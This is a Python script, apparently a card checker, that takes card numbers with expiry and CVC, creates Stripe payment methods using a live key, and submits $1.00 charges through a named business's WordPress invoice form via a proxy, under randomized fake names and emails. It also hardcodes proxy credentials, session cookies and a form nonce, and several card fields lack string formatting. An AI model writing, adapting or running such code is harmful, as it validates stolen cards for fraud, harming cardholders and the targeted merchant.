import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_d4a33102-zone-ratelimit:sgtxdhw0ygw5"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)
	
	url = "https://api.stripe.com/v1/payment_methods"
	
	payload = {
	  'type': "card",
	  'card[number]': f"{n}",
	  'card[cvc]': "{cvc}",
	  'card[exp_month]': "{mm}",
	  'card[exp_year]': "{yy}",
	  'payment_user_agent': "stripe.js/16ce65ed9f; stripe-js-v3/16ce65ed9f; card-element",
	  'key': "pk_live_51OOoQWBgmuLnBNKI3OaQxwXKZ0YhYPdppsiANVYhQTo0hsbpXYMCFveu0RKnJneFsTRbY4zDDBmwwgCbep3a6Ugk00E9EAZ2No"
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
	  'Accept': "application/json",
	  'authority': "api.stripe.com",
	  'accept-language': "en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5",
	  'origin': "https://js.stripe.com",
	  'referer': "https://js.stripe.com/",
	  'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'sec-fetch-dest': "empty",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-site': "same-site"
	}
	
	response = requests.post(url, data=payload, headers=headers)
	
	pm = response.json()['id']
	
	url = "https://progressivewestman.ca/wp-admin/admin-ajax.php"
	
	payload = {
	  'name-1-first-name': 'Rodam',
	  'name-1-last-name': 'User',
	  'text-1': '',
	  'email-1': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
	  'phone-1': '',
	  'text-2': '',
	  'number-1': '1.00',
	  'textarea-1': '',
	  'paymentid': '',
	  'paymentmethod': '',
	  'subscriptionid': '',
	  'referer_url': '',
	  'forminator_nonce': 'e1e7dddc3e',
	  '_wp_http_referer': '/pay-invoices/?srsltid=AfmBOoq5IqCjKNPUUPOaaJCeYcoIecPouCFRrqs-Y-g5Pd1j7iAVEK1K',
	  'form_id': '7054',
	  'page_id': '6014',
	  'form_type': 'default',
	  'current_url': 'https://progressivewestman.ca/pay-invoices/',
	  'render_id': '0',
	  'action': 'forminator_submit_form_custom-forms',
	  'action': 'forminator_update_payment_amount',
	  'paymentid': '',
	  'payment_method': f'{pm}',
	  'receipt_email': f'rodamuser{random_amount1}{random_amount2}@gmail.com'
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
	  'authority': "progressivewestman.ca",
	  'accept-language': "en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5",
	  'origin': "https://progressivewestman.ca",
	  'referer': "https://progressivewestman.ca/pay-invoices/?srsltid=AfmBOoq5IqCjKNPUUPOaaJCeYcoIecPouCFRrqs-Y-g5Pd1j7iAVEK1K",
	  'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'sec-fetch-dest': "empty",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-site': "same-origin",
	  'x-requested-with': "XMLHttpRequest",
	  'Cookie': "ac_enable_tracking=1; _ga=GA1.1.250480725.1746767044; _fbp=fb.1.1746767043808.312176889179141728; _gcl_au=1.1.334484287.1746767044; prism_28535630=f6aa4169-feb7-4e0f-ba44-c6f60f406872; __stripe_mid=641666b3-408b-479d-a5cc-5c36a907709a4f46f3; PHPSESSID=58d4e32a8b4ab3bcbe605dad7ea8f54b; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-05-21%2005%3A18%3A56%7C%7C%7Cep%3Dhttps%3A%2F%2Fprogressivewestman.ca%2Fpay-invoices%2F%3Fsrsltid%3DAfmBOoq5IqCjKNPUUPOaaJCeYcoIecPouCFRrqs-Y-g5Pd1j7iAVEK1K%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2025-05-21%2005%3A18%3A56%7C%7C%7Cep%3Dhttps%3A%2F%2Fprogressivewestman.ca%2Fpay-invoices%2F%3Fsrsltid%3DAfmBOoq5IqCjKNPUUPOaaJCeYcoIecPouCFRrqs-Y-g5Pd1j7iAVEK1K%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fprogressivewestman.ca%2Fpay-invoices%2F%3Fsrsltid%3DAfmBOoq5IqCjKNPUUPOaaJCeYcoIecPouCFRrqs-Y-g5Pd1j7iAVEK1K; _ga_Q6Y8ZZCQGS=GS2.1.s1747804737$o3$g0$t1747804737$j0$l0$h0; __stripe_sid=ceacc57f-fd24-4f6d-b623-73dbcf8838014a0ecc"
	}
	
	response = session.post(url, data=payload, headers=headers)
	
	pi = re.search(r'"paymentid":"(.*?)"', response.text).group(1)
	#print(pi)
	
	url = "https://progressivewestman.ca/wp-admin/admin-ajax.php"
	
	payload = {
	  'name-1-first-name': 'Rodam',
	  'name-1-last-name': 'User',
	  'text-1': '',
	  'email-1': f'rodamuser{random_amount1}{random_amount2}@gmail.com',
	  'phone-1': '',
	  'text-2': '',
	  'number-1': '1.00',
	  'textarea-1': '',
	  'paymentid': f'{pi}',
	  'paymentmethod': f'{pm}',
	  'subscriptionid': '',
	  'referer_url': '',
	  'forminator_nonce': 'e1e7dddc3e',
	  '_wp_http_referer': '/pay-invoices/?srsltid=AfmBOoq5IqCjKNPUUPOaaJCeYcoIecPouCFRrqs-Y-g5Pd1j7iAVEK1K',
	  'form_id': '7054',
	  'page_id': '6014',
	  'form_type': 'default',
	  'current_url': 'https://progressivewestman.ca/pay-invoices/',
	  'render_id': '0',
	  'action': 'forminator_submit_form_custom-forms'
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
	  'authority': "progressivewestman.ca",
	  'accept-language': "en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5",
	  'origin': "https://progressivewestman.ca",
	  'referer': "https://progressivewestman.ca/pay-invoices/?srsltid=AfmBOoq5IqCjKNPUUPOaaJCeYcoIecPouCFRrqs-Y-g5Pd1j7iAVEK1K",
	  'sec-ch-ua': "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'sec-fetch-dest': "empty",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-site': "same-origin",
	  'x-requested-with': "XMLHttpRequest",
	  'Cookie': "ac_enable_tracking=1; _ga=GA1.1.250480725.1746767044; _fbp=fb.1.1746767043808.312176889179141728; _gcl_au=1.1.334484287.1746767044; prism_28535630=f6aa4169-feb7-4e0f-ba44-c6f60f406872; __stripe_mid=641666b3-408b-479d-a5cc-5c36a907709a4f46f3; PHPSESSID=58d4e32a8b4ab3bcbe605dad7ea8f54b; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2025-05-21%2005%3A18%3A56%7C%7C%7Cep%3Dhttps%3A%2F%2Fprogressivewestman.ca%2Fpay-invoices%2F%3Fsrsltid%3DAfmBOoq5IqCjKNPUUPOaaJCeYcoIecPouCFRrqs-Y-g5Pd1j7iAVEK1K%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2025-05-21%2005%3A18%3A56%7C%7C%7Cep%3Dhttps%3A%2F%2Fprogressivewestman.ca%2Fpay-invoices%2F%3Fsrsltid%3DAfmBOoq5IqCjKNPUUPOaaJCeYcoIecPouCFRrqs-Y-g5Pd1j7iAVEK1K%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F132.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fprogressivewestman.ca%2Fpay-invoices%2F%3Fsrsltid%3DAfmBOoq5IqCjKNPUUPOaaJCeYcoIecPouCFRrqs-Y-g5Pd1j7iAVEK1K; _ga_Q6Y8ZZCQGS=GS2.1.s1747804737$o3$g0$t1747804737$j0$l0$h0; __stripe_sid=ceacc57f-fd24-4f6d-b623-73dbcf8838014a0ecc"
	}
	
	response = session.post(url, data=payload, headers=headers)
	
	result = re.search(r'"message":"(.*?)"', response.text).group(1)
	return (result)
